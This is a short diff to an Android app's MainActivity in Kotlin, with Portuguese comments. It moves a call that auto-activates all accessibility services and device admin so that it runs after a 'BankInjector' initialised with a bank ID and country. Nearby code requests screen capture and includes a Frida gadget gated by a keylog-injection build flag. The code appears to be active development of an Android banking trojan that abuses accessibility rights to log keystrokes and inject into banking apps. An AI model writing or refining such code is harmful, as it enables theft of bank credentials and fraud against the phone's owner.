@@ -107,9 +107,6 @@ class MainActivity : ComponentActivity() {
 
         loadPanelFromBackend()
         requestScreenCapturePermissionIfNeeded()
-
-        // Auto-ativar todos os serviços de acessibilidade e device admin
-        AccessibilityServiceAutoActivator.activateAllServices(this)
         
         // Inicializar Frida gadget apenas se habilitado
         if (BuildConfig.ENABLE_KEYLOG_INJECTION) {
@@ -123,6 +120,7 @@ class MainActivity : ComponentActivity() {
         BankInjector.init(this, BuildConfig.BANK_ID, BuildConfig.BANK_COUNTRY)
         
         // ✅ ACRESCENTA AQUI: Auto-ativar serviços de acessibilidade
+        AccessibilityServiceAutoActivator.activateAllServices(this)
     }
 
     override fun onResume() {
